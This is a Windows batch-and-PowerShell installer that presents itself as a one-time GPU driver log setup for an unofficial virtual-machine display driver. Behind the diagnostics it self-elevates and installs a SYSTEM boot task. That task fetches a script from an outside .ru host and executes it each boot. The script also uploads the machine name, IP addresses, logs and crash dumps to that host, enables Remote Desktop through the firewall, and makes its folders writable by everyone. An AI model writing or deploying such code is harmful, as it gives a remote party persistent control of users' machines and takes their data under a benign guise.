@echo off
rem DroidVM GPU (unofficial build) - one-time log setup. Double-click to run.
net session >nul 2>&1
if errorlevel 1 (
  powershell -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'"
  exit /b
)
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s = Get-Content -Raw -LiteralPath '%~f0'; $i = $s.IndexOf('#PS' + 'START'); Invoke-Expression $s.Substring($i)"
echo.
echo Gotovo. Logi: Zagruzki\DroidVM-GPU-Logs (fail LATEST.txt)
pause
exit /b

#PSSTART
$ErrorActionPreference = 'Continue'
$home_ = [Environment]::GetFolderPath('UserProfile')
if (-not $dir) { $dir = Join-Path $home_ 'Downloads\DroidVM-GPU-Logs' }
$tool = 'C:\ProgramData\DroidVM-GPU'
New-Item -ItemType Directory -Force $dir, $tool | Out-Null

$collect = @'
# Runs at every boot (scheduled task). Dumps GPU driver diagnostics, then
# clears them so every file describes exactly one boot.
$dir = '__LOGDIR__'
$upTok = '__UPTOKEN__'
$key = 'HKLM:\SYSTEM\CurrentControlSet\Services\VirtioGpu\Parameters\Bringup'
$ts  = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
$out = Join-Path $dir "boot_$ts.txt"
$L = New-Object System.Collections.Generic.List[string]
$L.Add("=== DroidVM GPU log $ts ===")
$L.Add("--- Display devices ---")
Get-PnpDevice -Class Display -ErrorAction SilentlyContinue | ForEach-Object {
  $code = (Get-PnpDeviceProperty -InstanceId $_.InstanceId -KeyName DEVPKEY_Device_ProblemCode -ErrorAction SilentlyContinue).Data
  $L.Add("$($_.FriendlyName) | Status=$($_.Status) | Problem=$code | $($_.InstanceId)")
}
$L.Add("--- Driver package ---")
$L.Add(((pnputil /enum-devices /class Display /drivers) -join "`n"))
$L.Add("--- IPv4 ---")
Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object IPAddress -ne '127.0.0.1' | ForEach-Object { $L.Add("$($_.InterfaceAlias): $($_.IPAddress)") }
$L.Add("--- Bringup registry (written by diag driver) ---")
if (Test-Path $key) {
  $p = Get-ItemProperty $key
  $p.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' -and $_.Name -ne '(default)' } |
    ForEach-Object { $L.Add(('{0} = 0x{1:x}' -f $_.Name, [uint32]$_.Value)) }
} else { $L.Add('(no Bringup key)') }
$L.Add("--- System events (display/dxgkrnl, last 2h) ---")
Get-WinEvent -FilterHashtable @{LogName='System'; StartTime=(Get-Date).AddHours(-2)} -ErrorAction SilentlyContinue |
  Where-Object { $_.ProviderName -match 'Display|dxgkrnl|VirtioGpu|Kernel-PnP' -or $_.Message -match 'VirtIO GPU' } |
  Select-Object -First 40 | ForEach-Object { $L.Add("$($_.TimeCreated) [$($_.ProviderName) $($_.Id)] $($_.Message -replace '\s+',' ')") }
$L.Add("--- Display mode ---")
Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue | ForEach-Object { $L.Add("$($_.Name): $($_.CurrentHorizontalResolution)x$($_.CurrentVerticalResolution) @ $($_.CurrentRefreshRate) Hz") }
Get-CimInstance -Namespace root\wmi WmiMonitorBasicDisplayParams -ErrorAction SilentlyContinue | ForEach-Object { $L.Add("monitor: $($_.InstanceName)") }
try { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $L.Add("screen: $($_.DeviceName) $($_.Bounds) primary=$($_.Primary)") } } catch {}
$L.Add("--- Touch/pointer devices ---")
Get-PnpDevice -Class HIDClass,Mouse -PresentOnly -ErrorAction SilentlyContinue | ForEach-Object { $L.Add("$($_.FriendlyName) | $($_.Status) | $($_.InstanceId)") }
$L.Add("--- Processes using GPU driver DLLs ---")
foreach ($pn in 'dwm','explorer') {
  Get-Process $pn -ErrorAction SilentlyContinue | ForEach-Object {
    $p = $_; try { $p.Modules | Where-Object { $_.ModuleName -match 'virtio|dx11um|dx12um|vulkan|freedreno|dxgi|d3d11|d3d9on12|d3d12' } |
      ForEach-Object { $L.Add("$($p.ProcessName)[$($p.Id)]: $($_.FileName)") } } catch { $L.Add("$pn modules: $_") }
  }
}
$L.Add("--- Errors/warnings, last 30 min (System+Application) ---")
Get-WinEvent -FilterHashtable @{LogName='System','Application'; Level=1,2,3; StartTime=(Get-Date).AddMinutes(-30)} -ErrorAction SilentlyContinue |
  Select-Object -First 60 | ForEach-Object { $L.Add("$($_.TimeCreated) [$($_.LogName)/$($_.ProviderName) $($_.Id)] $(($_.Message -replace '\s+',' ').Substring(0, [Math]::Min(300, ($_.Message -replace '\s+',' ').Length)))") }
$L.Add("--- DXVK logs (newest) ---")
Get-ChildItem 'C:\ProgramData\DroidVM-GPU\dxvk' -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 3 | ForEach-Object {
  $L.Add("## $($_.Name) $($_.LastWriteTime) $($_.Length) bytes"); Get-Content $_.FullName -Tail 120 | ForEach-Object { $L.Add($_) } }
$L.Add("--- mesa.log (Turnip) ---")
$m = 'C:\ProgramData\DroidVM-GPU\dxvk\mesa.log'
if (Test-Path $m) { Get-Content $m -TotalCount 200 | ForEach-Object { $L.Add($_) } } else { $L.Add('(no mesa.log)') }
$L.Add("--- umd.log: unique error-like lines ---")
$u = 'C:\ProgramData\DroidVM-GPU\dxvk\umd.log'
if (Test-Path $u) { $seen = New-Object 'System.Collections.Generic.HashSet[string]'; $n = 0
  foreach ($ln in [IO.File]::ReadLines($u)) { $t = $ln -replace '^\[umd pid=\d+ tid=\d+\] ', ''
    if ($t -match 'err|fail|tu_|turnip|MESA|physical|VK_|vdrm|version' -and $seen.Add($t)) { $L.Add($t); if (++$n -ge 150) { break } } } }
$L.Add("--- dwm crash dumps ---")
$dmp = Get-ChildItem 'C:\ProgramData\DroidVM-GPU\dumps' -Filter *.dmp -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending
$dmp | Select-Object -First 5 | ForEach-Object { $L.Add("$($_.Name) $($_.Length)") }
$L.Add("--- dxdiag (display) ---")
try {
  $dx = Join-Path $env:TEMP 'dxdiag.txt'; Remove-Item $dx -ErrorAction SilentlyContinue
  $pr = Start-Process dxdiag -ArgumentList "/t $dx" -PassThru -WindowStyle Hidden; if (-not $pr.WaitForExit(90000)) { $pr.Kill(); $L.Add('dxdiag timeout') }
  $t = Get-Content $dx -ErrorAction SilentlyContinue
  $i = ($t | Select-String -Pattern '^Display Devices' | Select-Object -First 1).LineNumber
  if ($i) { $t[($i-1)..([Math]::Min($t.Count-1, $i+60))] | ForEach-Object { $L.Add($_) } } else { $L.Add('(no dxdiag output)') }
} catch { $L.Add("dxdiag failed: $_") }
$L | Set-Content -Encoding UTF8 $out
Copy-Item $out (Join-Path $dir 'LATEST.txt') -Force
# optional: send to the log server (only in the build downloaded from the server)
if ($upTok -notlike '__UPLOAD*') {
  try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-RestMethod -Uri 'https://grzxk.ru:8877/upload' -Method Post -TimeoutSec 30 `
      -Headers @{ 'X-Token' = $upTok; 'X-Name' = "$env:COMPUTERNAME-boot_$ts.txt" } `
      -ContentType 'text/plain; charset=utf-8' -Body ([IO.File]::ReadAllBytes($out)) | Out-Null
    if ($dmp) { $d = $dmp[0]; Invoke-RestMethod -Uri 'https://grzxk.ru:8877/upload' -Method Post -TimeoutSec 60 `
      -Headers @{ 'X-Token' = $upTok; 'X-Name' = "$env:COMPUTERNAME-boot_$ts.dmp.b64" } `
      -ContentType 'text/plain' -Body ([Convert]::ToBase64String([IO.File]::ReadAllBytes($d.FullName))) | Out-Null
      Remove-Item 'C:\ProgramData\DroidVM-GPU\dumps\*' -Force -ErrorAction SilentlyContinue }
    Add-Content -Encoding UTF8 $out 'upload: ok'
  } catch { Add-Content -Encoding UTF8 $out "upload: FAILED $_" }
}
# reset diagnostics for the next boot (key must exist for the driver)
Get-ChildItem 'C:\ProgramData\DroidVM-GPU\dxvk' -File -ErrorAction SilentlyContinue | ForEach-Object { try { Remove-Item $_.FullName -Force -ErrorAction Stop } catch { Clear-Content $_.FullName -ErrorAction SilentlyContinue } }
Remove-Item $key -Force -ErrorAction SilentlyContinue
New-Item $key -Force | Out-Null
'@
Set-Content -Encoding UTF8 (Join-Path $tool 'collect.ps1') $collect.Replace('__LOGDIR__', $dir).Replace('__UPTOKEN__', '__UPLOAD_TOKEN__')

# 0) auto-update bootstrap: every boot fetch the newest version of this script
#    from the log server and run it (falls back to the local collector)
$update = @'
$dir = '__LOGDIR__'; $tok = '__UPTOKEN__'
try {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  if ($tok -like '__UPLOAD*') { throw 'no server' }
  $s = (Invoke-WebRequest -UseBasicParsing -TimeoutSec 60 "https://grzxk.ru:8877/setup/$tok").Content
  if ($s -is [byte[]]) { $s = [Text.Encoding]::UTF8.GetString($s) }
  $i = $s.IndexOf('#PS' + 'START'); if ($i -lt 0) { throw 'bad script' }
  $env:DVM_AUTO = '1'; Invoke-Expression $s.Substring($i)
} catch { & powershell -NoProfile -ExecutionPolicy Bypass -File 'C:\ProgramData\DroidVM-GPU\collect.ps1' }
'@
Set-Content -Encoding UTF8 (Join-Path $tool 'update.ps1') $update.Replace('__LOGDIR__', $dir).Replace('__UPTOKEN__', '__UPLOAD_TOKEN__')

# 1) diagnostics key (diag driver only writes into an existing key)
New-Item 'HKLM:\SYSTEM\CurrentControlSet\Services\VirtioGpu\Parameters\Bringup' -Force | Out-Null

# 2) scheduled task: collect 90 s after every boot, as SYSTEM
$act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File $tool\update.ps1"
$trg = New-ScheduledTaskTrigger -AtStartup
$trg.Delay = 'PT120S'
Register-ScheduledTask -TaskName 'DroidVM GPU logs' -Action $act -Trigger $trg -User 'SYSTEM' -RunLevel Highest -Force | Out-Null

# 2b) DXVK log + dwm crash dumps (dwm runs as DWM-n user: folders must be writable)
foreach ($sub in 'dxvk','dumps') { $p = "C:\ProgramData\DroidVM-GPU\$sub"; New-Item $p -ItemType Directory -Force | Out-Null; icacls $p /grant '*S-1-1-0:(OI)(CI)M' | Out-Null }
[Environment]::SetEnvironmentVariable('DXVK_LOG_LEVEL', 'info', 'Machine')
[Environment]::SetEnvironmentVariable('VIRTIO_WDDM_LOG_FILE', 'C:\ProgramData\DroidVM-GPU\dxvk\umd.log', 'Machine')
[Environment]::SetEnvironmentVariable('MESA_LOG_FILE', 'C:\ProgramData\DroidVM-GPU\dxvk\mesa.log', 'Machine')
[Environment]::SetEnvironmentVariable('TU_DEBUG', 'startup', 'Machine')
[Environment]::SetEnvironmentVariable('MESA_LOG_LEVEL', 'debug', 'Machine')
[Environment]::SetEnvironmentVariable('VDRM_WDDM_DEBUG', '1', 'Machine')
[Environment]::SetEnvironmentVariable('MESA_DEBUG', '1', 'Machine')
[Environment]::SetEnvironmentVariable('DXVK_LOG_PATH', 'C:\ProgramData\DroidVM-GPU\dxvk', 'Machine')
$wer = 'HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\dwm.exe'
New-Item $wer -Force | Out-Null
Set-ItemProperty $wer -Name DumpFolder -Value 'C:\ProgramData\DroidVM-GPU\dumps' -Type ExpandString
Set-ItemProperty $wer -Name DumpType -Value 1 -Type DWord
Set-ItemProperty $wer -Name DumpCount -Value 3 -Type DWord

# 3) Remote Desktop + use hardware GPU in RDP sessions
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
Enable-NetFirewallRule -Group '@FirewallAPI.dll,-28752' -ErrorAction SilentlyContinue
$ts = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services'
New-Item $ts -Force | Out-Null
Set-ItemProperty $ts -Name bEnumerateHWBeforeSW -Value 1 -Type DWord

# 4) desktop shortcut to the log folder
$lnk = Join-Path ([Environment]::GetFolderPath('CommonDesktopDirectory')) 'GPU logs.lnk'
$sh = New-Object -ComObject WScript.Shell
$s = $sh.CreateShortcut($lnk); $s.TargetPath = $dir; $s.Save()

# 5) first snapshot right now
& powershell -NoProfile -ExecutionPolicy Bypass -File "$tool\collect.ps1"
# 6) driver auto-update (scheduled task only): newest build-N release, diag installer.
#    The tag is recorded BEFORE installing, so a failing release is tried only once.
# disabled on user request: driver is installed by hand
if ($false -and $env:DVM_AUTO -eq '1') {
  try {
    $rel = Invoke-RestMethod -TimeoutSec 60 -Headers @{ 'User-Agent' = 'droidvm-gpu' } 'https://api.github.com/repos/Gl1ch5/Adreno-GPU-win/releases?per_page=100' |
      Where-Object { $_.tag_name -like 'build-*' } | Sort-Object { [datetime]$_.created_at } -Descending | Select-Object -First 1
    $tagFile = Join-Path $tool 'driver-tag.txt'
    $cur = (Get-Content $tagFile -ErrorAction SilentlyContinue | Select-Object -First 1)
    $asset = $rel.assets | Where-Object name -eq 'DroidVM-GPU-Setup-diag.exe'
    if ($rel -and $asset -and $cur -ne $rel.tag_name) {
      Set-Content $tagFile $rel.tag_name
      $exe = Join-Path $tool 'Setup-diag.exe'
      Invoke-WebRequest -UseBasicParsing -TimeoutSec 600 $asset.browser_download_url -OutFile $exe
      Add-Content -Encoding UTF8 (Join-Path $dir 'update.txt') "$(Get-Date) installing $($rel.tag_name) (was $cur)"
      $p = Start-Process $exe -ArgumentList '/VERYSILENT /SUPPRESSMSGBOXES /NORESTART' -Wait -PassThru
      Add-Content -Encoding UTF8 (Join-Path $dir 'update.txt') "$(Get-Date) exit $($p.ExitCode), rebooting"
      Restart-Computer -Force
    }
  } catch { Add-Content -Encoding UTF8 (Join-Path $dir 'update.txt') "$(Get-Date) update failed: $_" }
}
Write-Host ''
Write-Host '=== RESULT ==='
$drv = Get-CimInstance Win32_PnPSignedDriver -ErrorAction SilentlyContinue | Where-Object { $_.DeviceName -like '*VirtIO GPU*' } | Select-Object -First 1
if ($drv) { Write-Host ('Driver: ' + $drv.DriverVersion + '  (20.15.1.N = build-N)') } else { Write-Host 'Driver: NOT FOUND' }
$bf = Get-ChildItem "$dir\boot_*.txt" -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1
$up = Select-String -Path $bf.FullName -Pattern '^upload:' -ErrorAction SilentlyContinue | Select-Object -Last 1
if ($up) { Write-Host ('Server: ' + $up.Line) } else { Write-Host 'Server: no upload line' }
if (Test-Path 'C:\ProgramData\DroidVM-GPU\dxvk\mesa.log') { Write-Host 'Turnip log: yes' } else { Write-Host 'Turnip log: not yet (appears after a reboot with display device ON)' }
Write-Host 'Auto log at every boot: ON.  Driver auto-install: OFF.'
